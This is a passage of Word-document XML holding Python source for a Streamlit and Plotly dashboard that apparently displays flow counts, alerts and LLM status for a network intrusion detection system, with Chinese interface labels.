          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def render_tiles(stats: dict) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F6181B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    total = stats.get("total_flows", 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEAF144">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alerts = stats.get("alerts", [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596369AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    attack = total - stats.get("by_prediction", {}).get("BENIGN", 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D83E82">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    llm = stats.get("llm", {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E04463">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    c1, c2, c3, c4 = st.columns(4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A09F1D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    c1.metric("流总数", money_fmt(total))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202A9123">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    c2.metric("告警数", money_fmt(len(alerts)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C2F979">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    c3.metric("非 BENIGN 流", money_fmt(attack), delta=f"{attack / total:.1%}" if total else None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B01FF25">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    c4.metric("大模型", "可用" if llm.get("available") else "未配置 key",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="231AF9F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">              delta=f"失败 {llm.get('failures', 0)} 次" if llm.get("failures") else None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F352E42">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">              delta_color="inverse" if llm.get("failures") else "off")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3001E985">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="213FEDF6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C222C47">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def base_layout(fig: go.Figure, title: str, height: int = 300) -&gt; go.Figure:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0BF63B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig.update_layout(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4D8A10">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        title=dict(text=title, font=dict(size=14)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237E57CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        height=height,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A36E0B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        margin=dict(l=8, r=8, t=40, b=8),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B590057">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        paper_bgcolor="rgba(0,0,0,0)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A265075">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        plot_bgcolor="rgba(0,0,0,0)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4275B354">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        showlegend=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B312BAC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        font=dict(size=12),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF629C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBBBFCB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig.update_xaxes(gridcolor=GRID, zeroline=False, linecolor="#c3c2b7")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDF0D10">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig.update_yaxes(gridcolor=GRID, zeroline=False, linecolor="#c3c2b7")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A2F9F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return fig</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D0243A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26095D07">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69CB94D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 实时总览</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013274D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E0B0B73">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29DFAF41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def draw_live() -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01EC63D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    stats, err = api("/api/v1/stats", since=time.time() - minutes * 60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769ACC38">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if err:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6527A6C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.error(err)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03060AFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDA1190">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    render_tiles(stats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4AB836">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="444D9861">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    left, right = st.columns([3, 2])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622072F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E555398">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with left:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C0CD6E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        timeline = stats.get("timeline") or []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BE07D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if timeline:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AAA913F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            df = pd.DataFrame(timeline)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B75311F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            df["time"] = pd.to_datetime(df["bucket"] * 10, unit="s")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A899321">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            fig = go.Figure(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4732B7A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                go.Scatter(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4DBC54">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    x=df["time"], y=df["n"], mode="lines",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B8DE08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    line=dict(color=SERIES[0], width=2),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9BE0B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    hovertemplate="%{x|%H:%M:%S}&lt;br&gt;%{y} 条流&lt;extra&gt;&lt;/extra&gt;",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1471AC0A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E4D586">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6228D82B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            base_layout(fig, "每 10 秒的流数量")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F9A729">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.plotly_chart(fig, width="stretch", config={"displayModeBar": False})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B69858A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFFD985">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.info("窗口内还没有流。启动探针后：`python -m probe.sniffer --iface eth0`")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57705160">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E8D2380">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with right:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D96EB0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        by_pred = stats.get("by_prediction") or {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A6D5FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
